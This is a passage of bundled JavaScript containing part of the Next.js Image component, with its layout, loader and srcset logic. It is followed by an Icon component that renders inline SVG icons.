		                }
		            }
		        }
		    }
		    const imgStyle = Object.assign({}, style, layoutStyle);
		    const blurStyle = placeholder === 'blur' && !blurComplete ? {
		        backgroundSize: objectFit || 'cover',
		        backgroundPosition: objectPosition || '0% 0%',
		        filter: 'blur(20px)',
		        backgroundImage: `url("${blurDataURL}")`
		    } : {};
		    if (layout === 'fill') {
		        // <Image src="i.png" layout="fill" />
		        wrapperStyle.display = 'block';
		        wrapperStyle.position = 'absolute';
		        wrapperStyle.top = 0;
		        wrapperStyle.left = 0;
		        wrapperStyle.bottom = 0;
		        wrapperStyle.right = 0;
		    } else if (typeof widthInt !== 'undefined' && typeof heightInt !== 'undefined') {
		        // <Image src="i.png" width="100" height="100" />
		        const quotient = heightInt / widthInt;
		        const paddingTop = isNaN(quotient) ? '100%' : `${quotient * 100}%`;
		        if (layout === 'responsive') {
		            // <Image src="i.png" width="100" height="100" layout="responsive" />
		            wrapperStyle.display = 'block';
		            wrapperStyle.position = 'relative';
		            hasSizer = true;
		            sizerStyle.paddingTop = paddingTop;
		        } else if (layout === 'intrinsic') {
		            // <Image src="i.png" width="100" height="100" layout="intrinsic" />
		            wrapperStyle.display = 'inline-block';
		            wrapperStyle.position = 'relative';
		            wrapperStyle.maxWidth = '100%';
		            hasSizer = true;
		            sizerStyle.maxWidth = '100%';
		            sizerSvgUrl = `data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27${widthInt}%27%20height=%27${heightInt}%27/%3e`;
		        } else if (layout === 'fixed') {
		            // <Image src="i.png" width="100" height="100" layout="fixed" />
		            wrapperStyle.display = 'inline-block';
		            wrapperStyle.position = 'relative';
		            wrapperStyle.width = widthInt;
		            wrapperStyle.height = heightInt;
		        }
		    } else {
		        // <Image src="i.png" />
		        if (process.env.NODE_ENV !== 'production') {
		            throw new Error(`Image with src "${src}" must use "width" and "height" properties or "layout='fill'" property.`);
		        }
		    }
		    let imgAttributes = {
		        src: emptyDataURL,
		        srcSet: undefined,
		        sizes: undefined
		    };
		    if (isVisible) {
		        imgAttributes = generateImgAttrs({
		            config,
		            src,
		            unoptimized,
		            layout,
		            width: widthInt,
		            quality: qualityInt,
		            sizes,
		            loader
		        });
		    }
		    let srcString = src;
		    if (process.env.NODE_ENV !== 'production') {
		        if (typeof window !== 'undefined') {
		            let fullUrl;
		            try {
		                fullUrl = new URL(imgAttributes.src);
		            } catch (e) {
		                fullUrl = new URL(imgAttributes.src, window.location.href);
		            }
		            allImgs.set(fullUrl.href, {
		                src,
		                priority,
		                placeholder
		            });
		        }
		    }
		    let imageSrcSetPropName = 'imagesrcset';
		    let imageSizesPropName = 'imagesizes';
		    if (process.env.__NEXT_REACT_ROOT) {
		        imageSrcSetPropName = 'imageSrcSet';
		        imageSizesPropName = 'imageSizes';
		    }
		    const linkProps = {
		        // Note: imagesrcset and imagesizes are not in the link element type with react 17.
		        [imageSrcSetPropName]: imgAttributes.srcSet,
		        [imageSizesPropName]: imgAttributes.sizes,
		        crossOrigin: rest.crossOrigin
		    };
		    const useLayoutEffect = typeof window === 'undefined' ? _react.default.useEffect : _react.default.useLayoutEffect;
		    const onLoadingCompleteRef = (_react).useRef(onLoadingComplete);
		    const previousImageSrc = (_react).useRef(src);
		    (_react).useEffect(()=>{
		        onLoadingCompleteRef.current = onLoadingComplete;
		    }, [
		        onLoadingComplete
		    ]);
		    useLayoutEffect(()=>{
		        if (previousImageSrc.current !== src) {
		            resetIntersected();
		            previousImageSrc.current = src;
		        }
		    }, [
		        resetIntersected,
		        src
		    ]);
		    const imgElementArgs = _extends({
		        isLazy,
		        imgAttributes,
		        heightInt,
		        widthInt,
		        qualityInt,
		        layout,
		        className,
		        imgStyle,
		        blurStyle,
		        loading,
		        config,
		        unoptimized,
		        placeholder,
		        loader,
		        srcString,
		        onLoadingCompleteRef,
		        setBlurComplete,
		        setIntersection,
		        isVisible,
		        noscriptSizes: sizes
		    }, rest);
		    return /*#__PURE__*/ _react.default.createElement(_react.default.Fragment, null, /*#__PURE__*/ _react.default.createElement("span", {
		        style: wrapperStyle
		    }, hasSizer ? /*#__PURE__*/ _react.default.createElement("span", {
		        style: sizerStyle
		    }, sizerSvgUrl ? /*#__PURE__*/ _react.default.createElement("img", {
		        style: {
		            display: 'block',
		            maxWidth: '100%',
		            width: 'initial',
		            height: 'initial',
		            background: 'none',
		            opacity: 1,
		            border: 0,
		            margin: 0,
		            padding: 0
		        },
		        alt: "",
		        "aria-hidden": true,
		        src: sizerSvgUrl
		    }) : null) : null, /*#__PURE__*/ _react.default.createElement(ImageElement, Object.assign({}, imgElementArgs))), priority ? // Note how we omit the `href` attribute, as it would only be relevant
		    // for browsers that do not support `imagesrcset`, and in those cases
		    // it would likely cause the incorrect image to be preloaded.
		    //
		    // https://html.spec.whatwg.org/multipage/semantics.html#attr-link-imagesrcset
		    /*#__PURE__*/ _react.default.createElement(_head.default, null, /*#__PURE__*/ _react.default.createElement("link", Object.assign({
		        key: '__nimg-' + imgAttributes.src + imgAttributes.srcSet + imgAttributes.sizes,
		        rel: "preload",
		        as: "image",
		        href: imgAttributes.srcSet ? undefined : imgAttributes.src
		    }, linkProps))) : null);
		}
		function normalizeSrc(src) {
		    return src[0] === '/' ? src.slice(1) : src;
		}
		const configEnv = process.env.__NEXT_IMAGE_OPTS;
		const loadedImageURLs = new Set();
		const allImgs = new Map();
		let perfObserver;
		const emptyDataURL = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
		if (typeof window === 'undefined') {
		    commonjsGlobal.__NEXT_IMAGE_IMPORTED = true;
		}
		const VALID_LOADING_VALUES = [
		    'lazy',
		    'eager',
		    undefined
		];
		function imgixLoader({ config , src , width , quality  }) {
		    // Demo: https://static.imgix.net/daisy.png?auto=format&fit=max&w=300
		    const url = new URL(`${config.path}${normalizeSrc(src)}`);
		    const params = url.searchParams;
		    // auto params can be combined with comma separation, or reiteration
		    params.set('auto', params.getAll('auto').join(',') || 'format');
		    params.set('fit', params.get('fit') || 'max');
		    params.set('w', params.get('w') || width.toString());
		    if (quality) {
		        params.set('q', quality.toString());
		    }
		    return url.href;
		}
		function akamaiLoader({ config , src , width  }) {
		    return `${config.path}${normalizeSrc(src)}?imwidth=${width}`;
		}
		function cloudinaryLoader({ config , src , width , quality  }) {
		    // Demo: https://res.cloudinary.com/demo/image/upload/w_300,c_limit,q_auto/turtles.jpg
		    const params = [
		        'f_auto',
		        'c_limit',
		        'w_' + width,
		        'q_' + (quality || 'auto')
		    ];
		    const paramsString = params.join(',') + '/';
		    return `${config.path}${paramsString}${normalizeSrc(src)}`;
		}
		function customLoader({ src  }) {
		    throw new Error(`Image with src "${src}" is missing "loader" prop.` + `\nRead more: https://nextjs.org/docs/messages/next-image-missing-loader`);
		}
		function defaultLoader({ config , src , width , quality  }) {
		    if (process.env.NODE_ENV !== 'production') {
		        const missingValues = [];
		        // these should always be provided but make sure they are
		        if (!src) missingValues.push('src');
		        if (!width) missingValues.push('width');
		        if (missingValues.length > 0) {
		            throw new Error(`Next Image Optimization requires ${missingValues.join(', ')} to be provided. Make sure you pass them as props to the \`next/image\` component. Received: ${JSON.stringify({
		                src,
		                width,
		                quality
		            })}`);
		        }
		        if (src.startsWith('//')) {
		            throw new Error(`Failed to parse src "${src}" on \`next/image\`, protocol-relative URL (//) must be changed to an absolute URL (http:// or https://)`);
		        }
		        if (!src.startsWith('/') && (config.domains || config.remotePatterns)) {
		            let parsedSrc;
		            try {
		                parsedSrc = new URL(src);
		            } catch (err) {
		                console.error(err);
		                throw new Error(`Failed to parse src "${src}" on \`next/image\`, if using relative image it must start with a leading slash "/" or be an absolute URL (http:// or https://)`);
		            }
		            if (process.env.NODE_ENV !== 'test') {
		                // We use dynamic require because this should only error in development
		                const { hasMatch  } = requireMatchRemotePattern();
		                if (!hasMatch(config.domains, config.remotePatterns, parsedSrc)) {
		                    throw new Error(`Invalid src prop (${src}) on \`next/image\`, hostname "${parsedSrc.hostname}" is not configured under images in your \`next.config.js\`\n` + `See more info: https://nextjs.org/docs/messages/next-image-unconfigured-host`);
		                }
		            }
		        }
		    }
		    if (src.endsWith('.svg') && !config.dangerouslyAllowSVG) {
		        // Special case to make svg serve as-is to avoid proxying
		        // through the built-in Image Optimization API.
		        return src;
		    }
		    return `${(_normalizeTrailingSlash).normalizePathTrailingSlash(config.path)}?url=${encodeURIComponent(src)}&w=${width}&q=${quality || 75}`;
		}
		const loaders = new Map([
		    [
		        'default',
		        defaultLoader
		    ],
		    [
		        'imgix',
		        imgixLoader
		    ],
		    [
		        'cloudinary',
		        cloudinaryLoader
		    ],
		    [
		        'akamai',
		        akamaiLoader
		    ],
		    [
		        'custom',
		        customLoader
		    ], 
		]);
		const VALID_LAYOUT_VALUES = [
		    'fill',
		    'fixed',
		    'intrinsic',
		    'responsive',
		    undefined, 
		];
		function isStaticRequire(src) {
		    return src.default !== undefined;
		}
		function isStaticImageData(src) {
		    return src.src !== undefined;
		}
		function isStaticImport(src) {
		    return typeof src === 'object' && (isStaticRequire(src) || isStaticImageData(src));
		}
		function getWidths({ deviceSizes , allSizes  }, width, layout, sizes) {
		    if (sizes && (layout === 'fill' || layout === 'responsive')) {
		        // Find all the "vw" percent sizes used in the sizes prop
		        const viewportWidthRe = /(^|\s)(1?\d?\d)vw/g;
		        const percentSizes = [];
		        for(let match; match = viewportWidthRe.exec(sizes); match){
		            percentSizes.push(parseInt(match[2]));
		        }
		        if (percentSizes.length) {
		            const smallestRatio = Math.min(...percentSizes) * 0.01;
		            return {
		                widths: allSizes.filter((s)=>s >= deviceSizes[0] * smallestRatio),
		                kind: 'w'
		            };
		        }
		        return {
		            widths: allSizes,
		            kind: 'w'
		        };
		    }
		    if (typeof width !== 'number' || layout === 'fill' || layout === 'responsive') {
		        return {
		            widths: deviceSizes,
		            kind: 'w'
		        };
		    }
		    const widths = [
		        ...new Set(// > This means that most OLED screens that say they are 3x resolution,
		        // > are actually 3x in the green color, but only 1.5x in the red and
		        // > blue colors. Showing a 3x resolution image in the app vs a 2x
		        // > resolution image will be visually the same, though the 3x image
		        // > takes significantly more data. Even true 3x resolution screens are
		        // > wasteful as the human eye cannot see that level of detail without
		        // > something like a magnifying glass.
		        // https://blog.twitter.com/engineering/en_us/topics/infrastructure/2019/capping-image-fidelity-on-ultra-high-resolution-devices.html
		        [
		            width,
		            width * 2 /*, width * 3*/ 
		        ].map((w)=>allSizes.find((p)=>p >= w) || allSizes[allSizes.length - 1])), 
		    ];
		    return {
		        widths,
		        kind: 'x'
		    };
		}
		function generateImgAttrs({ config , src , unoptimized , layout , width , quality , sizes , loader  }) {
		    if (unoptimized) {
		        return {
		            src,
		            srcSet: undefined,
		            sizes: undefined
		        };
		    }
		    const { widths , kind  } = getWidths(config, width, layout, sizes);
		    const last = widths.length - 1;
		    return {
		        sizes: !sizes && kind === 'w' ? '100vw' : sizes,
		        srcSet: widths.map((w, i)=>`${loader({
		                config,
		                src,
		                quality,
		                width: w
		            })} ${kind === 'w' ? w : i + 1}${kind}`).join(', '),
		        // It's intended to keep `src` the last attribute because React updates
		        // attributes in order. If we keep `src` the first one, Safari will
		        // immediately start to fetch `src`, before `sizes` and `srcSet` are even
		        // updated by React. That causes multiple unnecessary requests if `srcSet`
		        // and `sizes` are defined.
		        // This bug cannot be reproduced in Chrome or Firefox.
		        src: loader({
		            config,
		            src,
		            quality,
		            width: widths[last]
		        })
		    };
		}
		function getInt(x) {
		    if (typeof x === 'number') {
		        return x;
		    }
		    if (typeof x === 'string') {
		        return parseInt(x, 10);
		    }
		    return undefined;
		}
		function defaultImageLoader(loaderProps) {
		    var ref;
		    const loaderKey = ((ref = loaderProps.config) == null ? void 0 : ref.loader) || 'default';
		    const load = loaders.get(loaderKey);
		    if (load) {
		        return load(loaderProps);
		    }
		    throw new Error(`Unknown "loader" found in "next.config.js". Expected: ${_imageConfig.VALID_LOADERS.join(', ')}. Received: ${loaderKey}`);
		}
		// See https://stackoverflow.com/q/39777833/266535 for why we use this ref
		// handler instead of the img's onLoad attribute.
		function handleLoading(img, src, layout, placeholder, onLoadingCompleteRef, setBlurComplete) {
		    if (!img || img.src === emptyDataURL || img['data-loaded-src'] === src) {
		        return;
		    }
		    img['data-loaded-src'] = src;
		    const p = 'decode' in img ? img.decode() : Promise.resolve();
		    p.catch(()=>{}).then(()=>{
		        if (!img.parentNode) {
		            // Exit early in case of race condition:
		            // - onload() is called
		            // - decode() is called but incomplete
		            // - unmount is called
		            // - decode() completes
		            return;
		        }
		        loadedImageURLs.add(src);
		        if (placeholder === 'blur') {
		            setBlurComplete(true);
		        }
		        if (onLoadingCompleteRef == null ? void 0 : onLoadingCompleteRef.current) {
		            const { naturalWidth , naturalHeight  } = img;
		            // Pass back read-only primitive values but not the
		            // underlying DOM element because it could be misused.
		            onLoadingCompleteRef.current({
		                naturalWidth,
		                naturalHeight
		            });
		        }
		        if (process.env.NODE_ENV !== 'production') {
		            var ref;
		            if ((ref = img.parentElement) == null ? void 0 : ref.parentElement) {
		                const parent = getComputedStyle(img.parentElement.parentElement);
		                if (!parent.position) ; else if (layout === 'responsive' && parent.display === 'flex') {
		                    (_utils).warnOnce(`Image with src "${src}" may not render properly as a child of a flex container. Consider wrapping the image with a div to configure the width.`);
		                } else if (layout === 'fill' && parent.position !== 'relative' && parent.position !== 'fixed' && parent.position !== 'absolute') {
		                    (_utils).warnOnce(`Image with src "${src}" may not render properly with a parent using position:"${parent.position}". Consider changing the parent style to position:"relative" with a width and height.`);
		                }
		            }
		        }
		    });
		}
		const ImageElement = (_param)=>{
		    var { imgAttributes , heightInt , widthInt , qualityInt , layout , className , imgStyle , blurStyle , isLazy , placeholder , loading , srcString , config , unoptimized , loader , onLoadingCompleteRef , setBlurComplete , setIntersection , onLoad , onError , isVisible , noscriptSizes  } = _param, rest = _object_without_properties_loose(_param, [
		        "imgAttributes",
		        "heightInt",
		        "widthInt",
		        "qualityInt",
		        "layout",
		        "className",
		        "imgStyle",
		        "blurStyle",
		        "isLazy",
		        "placeholder",
		        "loading",
		        "srcString",
		        "config",
		        "unoptimized",
		        "loader",
		        "onLoadingCompleteRef",
		        "setBlurComplete",
		        "setIntersection",
		        "onLoad",
		        "onError",
		        "isVisible",
		        "noscriptSizes"
		    ]);
		    loading = isLazy ? 'lazy' : loading;
		    return /*#__PURE__*/ _react.default.createElement(_react.default.Fragment, null, /*#__PURE__*/ _react.default.createElement("img", Object.assign({}, rest, imgAttributes, {
		        decoding: "async",
		        "data-nimg": layout,
		        className: className,
		        style: _extends({}, imgStyle, blurStyle),
		        ref: (_react).useCallback((img)=>{
		            if (process.env.NODE_ENV !== 'production') {
		                if (img && !srcString) {
		                    console.error(`Image is missing required "src" property:`, img);
		                }
		            }
		            setIntersection(img);
		            if (img == null ? void 0 : img.complete) {
		                handleLoading(img, srcString, layout, placeholder, onLoadingCompleteRef, setBlurComplete);
		            }
		        }, [
		            setIntersection,
		            srcString,
		            layout,
		            placeholder,
		            onLoadingCompleteRef,
		            setBlurComplete, 
		        ]),
		        onLoad: (event)=>{
		            const img = event.currentTarget;
		            handleLoading(img, srcString, layout, placeholder, onLoadingCompleteRef, setBlurComplete);
		            if (onLoad) {
		                onLoad(event);
		            }
		        },
		        onError: (event)=>{
		            if (placeholder === 'blur') {
		                // If the real image fails to load, this will still remove the placeholder.
		                setBlurComplete(true);
		            }
		            if (onError) {
		                onError(event);
		            }
		        }
		    })), (isLazy || placeholder === 'blur') && /*#__PURE__*/ _react.default.createElement("noscript", null, /*#__PURE__*/ _react.default.createElement("img", Object.assign({}, rest, generateImgAttrs({
		        config,
		        src: srcString,
		        unoptimized,
		        layout,
		        width: widthInt,
		        quality: qualityInt,
		        sizes: noscriptSizes,
		        loader
		    }), {
		        decoding: "async",
		        "data-nimg": layout,
		        style: imgStyle,
		        className: className,
		        // @ts-ignore - TODO: upgrade to `@types/react@17`
		        loading: loading
		    }))));
		};

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (image$1, image$1.exports));
	return image$1.exports;
}

var image;
var hasRequiredImage;

function requireImage () {
	if (hasRequiredImage) return image;
	hasRequiredImage = 1;
	image = requireImage$1();
	return image;
}

var imageExports = requireImage();
var Image = /*@__PURE__*/getDefaultExportFromCjs(imageExports);

var _excluded$7 = ["type", "alt"];
var Icon = function Icon(_ref) {
  var type = _ref.type,
    alt = _ref.alt,
    props = _objectWithoutProperties(_ref, _excluded$7);
  switch (type) {
    case "plus":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "11",
        height: "11",
        viewBox: "0 0 11 11",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "plus"), /*#__PURE__*/React__default.createElement("path", {
        d: "M5.83643 0.133972C3.07926 0.133972 0.836426 2.44277 0.836426 5.28103C0.836426 8.11929 3.07926 10.4281 5.83643 10.4281C8.59359 10.4281 10.8364 8.11889 10.8364 5.28103C10.8364 2.44317 8.59359 0.133972 5.83643 0.133972ZM5.83643 9.63072C3.50684 9.63072 1.61102 7.67954 1.61102 5.28103C1.61102 2.88252 3.50684 0.931344 5.83643 0.931344C8.16602 0.931344 10.0618 2.88252 10.0618 5.28103C10.0618 7.67954 8.16641 9.63072 5.83643 9.63072Z",
        fill: "#F64900"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M7.77297 4.84647H6.22379V3.25172C6.22379 3.03165 6.05066 2.85303 5.83648 2.85303C5.6223 2.85303 5.44918 3.03165 5.44918 3.25172V4.84647H3.9C3.68582 4.84647 3.5127 5.02509 3.5127 5.24516C3.5127 5.46524 3.68582 5.64386 3.9 5.64386H5.44918V7.2386C5.44918 7.45868 5.6223 7.6373 5.83648 7.6373C6.05066 7.6373 6.22379 7.45868 6.22379 7.2386V5.64386H7.77297C7.98715 5.64386 8.16027 5.46524 8.16027 5.24516C8.16027 5.02509 7.98715 4.84647 7.77297 4.84647Z",
        fill: "#F64900"
      }));
    case "success-green":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "130",
        height: "131",
        viewBox: "0 0 130 131",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "success-green"), /*#__PURE__*/React__default.createElement("path", {
        d: "M93.2097 0.0859375H36.855C14.82 0.0859375 0 15.5559 0 38.5659V91.6709C0 114.616 14.82 130.086 36.855 130.086H93.2097C115.245 130.086 130 114.616 130 91.6709V38.5659C130 15.5559 115.245 0.0859375 93.2097 0.0859375Z",
        fill: "#67AF61"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M57.287 86.1987C55.831 86.1987 54.375 85.6462 53.2635 84.5347L37.8391 69.1102C35.6161 66.8872 35.6161 63.2862 37.8391 61.0697C40.0621 58.8467 43.6566 58.8402 45.8796 61.0632L57.287 72.4707L84.119 45.6387C86.342 43.4157 89.9365 43.4157 92.1595 45.6387C94.3825 47.8617 94.3825 51.4627 92.1595 53.6857L61.3105 84.5347C60.199 85.6462 58.743 86.1987 57.287 86.1987Z",
        fill: "white"
      }));
    case "check-round":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "24",
        height: "25",
        viewBox: "0 0 24 25",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "check"), /*#__PURE__*/React__default.createElement("path", {
        d: "M11.9993 24.8281C5.38313 24.8281 0 19.4443 0 12.8275C0 6.21063 5.38313 0.828179 11.9993 0.828179C13.8967 0.822482 15.7678 1.27167 17.4559 2.13809C17.618 2.22103 17.7406 2.36498 17.7966 2.53828C17.8526 2.71158 17.8375 2.90003 17.7545 3.06217C17.6716 3.22431 17.5276 3.34687 17.3543 3.40287C17.181 3.45888 16.9926 3.44375 16.8304 3.36081C15.3359 2.59377 13.6792 2.19614 11.9993 2.20125C6.1397 2.20125 1.37307 6.96788 1.37307 12.8275C1.37307 18.6871 6.1397 23.4551 11.9993 23.4551C17.8589 23.4551 22.6255 18.6871 22.6255 12.8275C22.626 11.9139 22.509 11.0041 22.2774 10.1205C22.2352 9.94576 22.2632 9.76148 22.3554 9.6072C22.4475 9.45291 22.5965 9.34091 22.7704 9.29526C22.9442 9.2496 23.129 9.27392 23.2851 9.363C23.4411 9.45208 23.5561 9.59881 23.6052 9.77169C23.8665 10.7695 23.9985 11.7967 23.9979 12.8282C23.9986 19.4443 18.6161 24.8281 11.9993 24.8281Z",
        fill: props.color || "black",
        fillOpacity: props.opacity || "0.1"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M11.6302 15.7219C11.4482 15.7218 11.2736 15.6495 11.1448 15.5207L7.66754 12.0434C7.55043 11.9128 7.48777 11.7423 7.49243 11.5669C7.49709 11.3915 7.56871 11.2246 7.69258 11.1004C7.81646 10.9761 7.98319 10.9041 8.15855 10.8989C8.33391 10.8937 8.50459 10.9559 8.63555 11.0727L11.6275 14.0646L22.4713 3.22348C22.6008 3.09842 22.7742 3.02922 22.9542 3.03079C23.1342 3.03235 23.3064 3.10455 23.4337 3.23184C23.561 3.35913 23.6332 3.53133 23.6348 3.71133C23.6363 3.89134 23.5671 4.06476 23.4421 4.19424L12.1142 15.5221C11.9856 15.65 11.8116 15.7218 11.6302 15.7219Z",
        fill: props.color || "black",
        fillOpacity: props.opacity || "0.1"
      }));
    case "listingLoading":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "26",
        height: "26",
        viewBox: "0 0 26 26",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "listingLoading"), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.4297 1.30775V3.59346C12.4297 3.90888 12.6857 4.16488 13.0011 4.16488C13.3165 4.16488 13.5725 3.90888 13.5725 3.59346V1.30775C13.5725 0.992327 13.3165 0.736328 13.0011 0.736328C12.6857 0.736328 12.4297 0.992327 12.4297 1.30775Z",
        fill: "#F64900",
        fillOpacity: "0.42"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.2797 1.30775V3.59346C12.2797 3.99173 12.6028 4.31488 13.0011 4.31488C13.3994 4.31488 13.7225 3.99173 13.7225 3.59346V1.30775C13.7225 0.909484 13.3994 0.586328 13.0011 0.586328C12.6028 0.586328 12.2797 0.909484 12.2797 1.30775Z",
        stroke: "#F64900",
        strokeOpacity: "0.42",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M2.81697 7.51698L4.79639 8.65983C5.06954 8.81754 5.41925 8.72383 5.57696 8.45069C5.73468 8.17754 5.64096 7.82783 5.36782 7.67012L3.3884 6.52727C3.11526 6.36955 2.76555 6.46327 2.60783 6.73641C2.45012 7.00955 2.54383 7.35926 2.81697 7.51698Z",
        fill: "#F64900",
        fillOpacity: "0.32"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M4.72139 8.78973C5.06628 8.98887 5.50773 8.87057 5.70686 8.52569C5.90601 8.1808 5.7877 7.73935 5.44283 7.54022L5.44282 7.54022L3.46341 6.39737C3.4634 6.39737 3.4634 6.39736 3.4634 6.39736C3.11851 6.19822 2.67706 6.31653 2.47793 6.6614C2.27879 7.0063 2.3971 7.44774 2.74197 7.64688L2.74197 7.64688L4.72139 8.78973ZM4.72139 8.78973L4.79639 8.65983M4.72139 8.78973L4.72139 8.78973L4.79639 8.65983M4.79639 8.65983L2.81697 7.51698L3.3884 6.52727L5.36782 7.67012C5.64096 7.82783 5.73468 8.17754 5.57696 8.45069C5.41925 8.72383 5.06954 8.81754 4.79639 8.65983Z",
        stroke: "#F64900",
        strokeOpacity: "0.32",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M3.3884 18.9455L5.36782 17.8026C5.64096 17.6449 5.73468 17.2952 5.57696 17.0221C5.41925 16.7489 5.06954 16.6552 4.79639 16.8129L2.81697 17.9558C2.54383 18.1135 2.45012 18.4632 2.60783 18.7363C2.76555 19.0095 3.11526 19.1032 3.3884 18.9455Z",
        fill: "#F64900",
        fillOpacity: "0.16"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M5.44283 17.9325L5.44282 17.9325L3.46341 19.0754L3.4634 19.0754L5.44283 17.9325ZM5.44283 17.9325C5.7877 17.7334 5.90601 17.2919 5.70686 16.947M5.44283 17.9325L5.70686 16.947M5.70686 16.947C5.50773 16.6022 5.06629 16.4839 4.72139 16.683M5.70686 16.947L4.72139 16.683M4.72139 16.683C4.72139 16.683 4.72139 16.683 4.72139 16.683L4.72139 16.683Z",
        stroke: "#F64900",
        strokeOpacity: "0.16",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M1.57143 13.3079H3.85713C4.17256 13.3079 4.42856 13.0519 4.42856 12.7365C4.42856 12.421 4.17256 12.165 3.85713 12.165H1.57143C1.256 12.165 1 12.421 1 12.7365C1 13.0519 1.256 13.3079 1.57143 13.3079Z",
        fill: "#F64900",
        fillOpacity: "0.22"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M1.57143 13.4579H3.85713C4.2554 13.4579 4.57856 13.1347 4.57856 12.7365C4.57856 12.3382 4.2554 12.015 3.85713 12.015H1.57143C1.17316 12.015 0.85 12.3382 0.85 12.7365C0.85 13.1347 1.17316 13.4579 1.57143 13.4579Z",
        stroke: "#F64900",
        strokeOpacity: "0.22",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M7.78114 22.9191L8.92399 20.9397C9.0817 20.6665 8.98799 20.3168 8.71485 20.1591C8.44171 20.0014 8.09199 20.0951 7.93428 20.3682L6.79143 22.3477C6.63371 22.6208 6.72743 22.9705 7.00057 23.1282C7.27371 23.2859 7.62342 23.1922 7.78114 22.9191Z",
        fill: "#F64900",
        fillOpacity: "0.16"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M9.05389 21.0147C9.25303 20.6698 9.13473 20.2283 8.78985 20.0292C8.44496 19.8301 8.00351 19.9484 7.80438 20.2932L7.80438 20.2932L6.66153 22.2727C6.66153 22.2727 6.66152 22.2727 6.66152 22.2727C6.46238 22.6176 6.58069 23.059 6.92556 23.2581C7.27046 23.4573 7.7119 23.339 7.91104 22.9941L7.91104 22.9941L9.05389 21.0147ZM9.05389 21.0147L8.92399 20.9397M9.05389 21.0147L9.05389 21.0147L8.92399 20.9397M8.92399 20.9397L7.78114 22.9191L6.79143 22.3477L7.93428 20.3682C8.09199 20.0951 8.44171 20.0014 8.71485 20.1591C8.98799 20.3168 9.0817 20.6665 8.92399 20.9397Z",
        stroke: "#F64900",
        strokeOpacity: "0.16",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M18.1962 20.2932L18.1962 20.2932L19.339 22.2727L19.339 22.2727L19.2091 22.3477L18.1962 20.2932ZM18.1962 20.2932C17.9971 19.9484 17.5556 19.8301 17.2107 20.0292M18.1962 20.2932L17.2107 20.0292M17.2107 20.0292C16.8658 20.2283 16.7475 20.6698 16.9467 21.0147M17.2107 20.0292L16.9467 21.0147M16.9467 21.0147C16.9467 21.0147 16.9467 21.0147 16.9467 21.0147L16.9467 21.0147Z",
        fill: "#F64900",
        stroke: "#F64900",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.4297 21.879V24.1647C12.4297 24.4802 12.6857 24.7362 13.0011 24.7362C13.3165 24.7362 13.5725 24.4802 13.5725 24.1647V21.879C13.5725 21.5636 13.3165 21.3076 13.0011 21.3076C12.6857 21.3076 12.4297 21.5636 12.4297 21.879Z",
        fill: "#F64900",
        fillOpacity: "0.07"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.2797 21.879V24.1647C12.2797 24.563 12.6028 24.8862 13.0011 24.8862C13.3994 24.8862 13.7225 24.563 13.7225 24.1647V21.879C13.7225 21.4808 13.3994 21.1576 13.0011 21.1576C12.6028 21.1576 12.2797 21.4808 12.2797 21.879Z",
        stroke: "#F64900",
        strokeOpacity: "0.07",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M22.5378 19.0754C22.8827 19.2745 23.3241 19.1562 23.5233 18.8113C23.7224 18.4664 23.6041 18.025 23.2592 17.8259L23.2592 17.8259L21.2798 16.683C21.2798 16.683 21.2798 16.683 21.2798 16.683C20.9349 16.4839 20.4935 16.6022 20.2943 16.947C20.0952 17.2919 20.2135 17.7334 20.5584 17.9325L20.5584 17.9325L22.5378 19.0754ZM22.5378 19.0754L22.6128 18.9455M22.5378 19.0754L22.5378 19.0754L22.6128 18.9455M22.6128 18.9455L20.6334 17.8026L23.1842 17.9558C23.4574 18.1135 23.5511 18.4632 23.3934 18.7363C23.2357 19.0095 22.8859 19.1032 22.6128 18.9455Z",
        fill: "#F64900",
        fillOpacity: "0.8",
        stroke: "#F64900",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
